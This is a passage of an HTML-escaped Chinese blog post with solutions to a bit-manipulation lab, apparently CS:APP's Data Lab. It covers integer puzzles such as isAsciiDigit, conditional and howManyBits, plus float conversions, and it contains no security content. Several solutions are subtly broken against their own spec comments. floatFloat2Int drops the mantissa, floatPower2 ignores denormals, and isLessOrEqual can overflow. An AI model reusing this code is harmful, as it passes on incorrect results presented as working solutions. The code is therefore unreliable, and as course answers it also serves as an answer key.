&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            isAsciiDigit(0x3a) = 0.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            isAsciiDigit(0x05) = 0.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 15
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isAsciiDigit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;((x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(((x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;conditional&#34;&gt;conditional&lt;/h3&gt;
&lt;p&gt;要实现一个三目运算&lt;/p&gt;
&lt;p&gt;先将 &lt;code&gt;x&lt;/code&gt; 转换为 &lt;code&gt;0&lt;/code&gt; 或 &lt;code&gt;0xffffffff&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后再使用位运算进行输出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;conditional&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; y, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; z) {
  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~!&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// if x != 0 -&amp;gt; x = 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;               &lt;span style=&#34;color:#75715e&#34;&gt;// if x == 0 -&amp;gt; x = 0xffffffff
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; y) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; z);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;islessorequal&#34;&gt;isLessOrEqual&lt;/h3&gt;
&lt;p&gt;判断 x 是否小于等于 y&lt;/p&gt;
&lt;p&gt;判断相减后是否大于 0 即可，用位运算代替减法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * isLessOrEqual - if x &amp;lt;= y  then return 1, else return 0 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: isLessOrEqual(4,5) = 1.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 24
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isLessOrEqual&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; y) {
  y &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;logicalneg&#34;&gt;logicalNeg&lt;/h3&gt;
&lt;p&gt;利用位运算实现 &lt;code&gt;!&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在int型的右移运算中，正数会在开头补 0，而负数则会在开头补 1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * logicalNeg - implement the ! operator, using all of 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *              the legal operators except !
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 12
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;logicalNeg&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
  &lt;span style=&#34;color:#75715e&#34;&gt;// In right shift, negative number will fixed with 1 at MSB.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (((&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; x) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;howmanybits&#34;&gt;howManyBits&lt;/h3&gt;
&lt;p&gt;计算多少位可以表示一个数&lt;/p&gt;
&lt;p&gt;还是利用右移运算进行二分&lt;/p&gt;
&lt;p&gt;由于需要预留符号位，最后需要 &lt;code&gt;+1&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* howManyBits - return the minimum number of bits required to represent x in
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *             two&amp;#39;s complement
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Examples: howManyBits(12) = 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(298) = 10
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(-5) = 4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(0)  = 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(-1) = 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(0x80000000) = 32
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Max ops: 90
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Rating: 4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;howManyBits&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; sign, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, cur;
  sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;;
  sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~!&lt;/span&gt;sign &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;sign) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; sign);
  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;floatscale2&#34;&gt;floatScale2&lt;/h3&gt;
&lt;p&gt;后面几个是浮点数相关操作&lt;/p&gt;
&lt;p&gt;计算 &lt;code&gt;f*2&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * floatScale2 - Return bit-level equivalent of expression 2*f for
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   floating point argument f.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Both the argument and result are passed as unsigned int&amp;#39;s, but
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   they are to be interpreted as the bit-level representation of
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   single-precision floating point values.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   When argument is NaN, return argument
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. also if, while
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 30
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;floatScale2&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; uf) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; uf;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; uf;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; uf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (uf &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; sign) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sign;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;floatfloat2int&#34;&gt;floatFloat2Int&lt;/h3&gt;
&lt;p&gt;保留 f 的整数部分&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * floatFloat2Int - Return bit-level equivalent of expression (int) f
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   for floating point argument f.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Argument is passed as unsigned int, but
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   it is to be interpreted as the bit-level representation of a
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   single-precision floating point value.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Anything out of range (including NaN and infinity) should return
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   0x80000000u.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. also if, while
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 30
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;floatFloat2Int&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; uf) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;, sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;, pow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (e &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80000000&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (e &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  pow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; e;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (sign) pow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;pow &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pow;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;floatpower2&#34;&gt;floatPower2&lt;/h3&gt;
&lt;p&gt;计算 $2.0^x$&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * floatPower2 - Return bit-level equivalent of the expression 2.0^x
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   (2.0 raised to the power x) for any 32-bit integer x.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   The unsigned value that is returned should have the identical bit
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   representation as the single-precision floating-point number 2.0^x.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   If the result is too small to be represented as a denorm, return
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   0. If too large, return +INF.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. Also if, while 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 30 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;floatPower2&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;result&#34;&gt;result&lt;/h3&gt;
&lt;p&gt;先使用 &lt;code&gt;./dlc&lt;/code&gt; 验证使用的操作是否满足要求&lt;/p&gt;
